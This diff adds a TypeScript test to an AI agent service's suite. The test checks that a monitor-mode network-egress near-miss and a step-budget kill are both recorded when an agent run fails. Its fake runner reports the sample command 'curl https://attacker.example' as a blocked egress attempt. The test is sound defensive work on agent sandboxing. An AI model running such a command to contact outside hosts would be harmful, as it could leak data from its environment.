@@ -273,3 +273,59 @@ describe("runaway execution budget", () => {
     expect(service.getAgent(agent.id).status).toBe("ready");
   });
 });
+
+/**
+ * @covers TM-AGENT-002
+ * Monitor-mode near-misses survive a subsequent failure of the same run.
+ */
+class MonitorThenFailRunner implements AgentRunner {
+  async run(): Promise<RunnerResult> {
+    const { BudgetExceededError } = await import("./errors.js");
+    const error = new BudgetExceededError(50, 51);
+    (error as { observations?: unknown }).observations = [
+      {
+        rule: "network-egress-denied",
+        command: "curl https://attacker.example",
+        detail: "Command contacts non-allowlisted host(s): attacker.example.",
+      },
+    ];
+    throw error;
+  }
+  async cancel(): Promise<boolean> {
+    return false;
+  }
+  async isAvailable(): Promise<boolean> {
+    return true;
+  }
+}
+
+describe("monitor evidence on failure", () => {
+  it("persists observed near-misses even when the run fails", async () => {
+    const root = await mkdtemp(path.join(tmpdir(), "launchpad-test-"));
+    temporaryDirectories.push(root);
+    const config = loadConfig({
+      NODE_ENV: "test",
+      APP_DATA_DIR: path.join(root, "data"),
+      AGENT_WORKSPACE_ROOT: path.join(root, "workspaces"),
+      CODEX_HOME: path.join(root, "codex"),
+      ARK_API_KEY: "test-key",
+      ARK_MODEL: "ep-test",
+      POLICY_ENFORCEMENT: "monitor",
+    });
+    const service = new AgentService(
+      config,
+      new JsonStore(path.join(root, "data", "db.json")),
+      new WorkspaceManager(path.join(root, "workspaces")),
+      new MonitorThenFailRunner(),
+    );
+    await service.initialize();
+    const agent = await service.createAgent({ name: "Shadow" });
+    const { run } = await service.sendMessage(agent.id, "loop");
+    await expect.poll(() => service.getRun(run.id).status).toBe("terminated");
+
+    const events = service.getPolicyEvents(agent.id);
+    // Both the budget kill AND the monitored near-miss are recorded.
+    expect(events.some((e) => e.rule === "network-egress-denied" && !e.enforced)).toBe(true);
+    expect(events.some((e) => e.rule === "step-budget-exceeded")).toBe(true);
+  });
+});
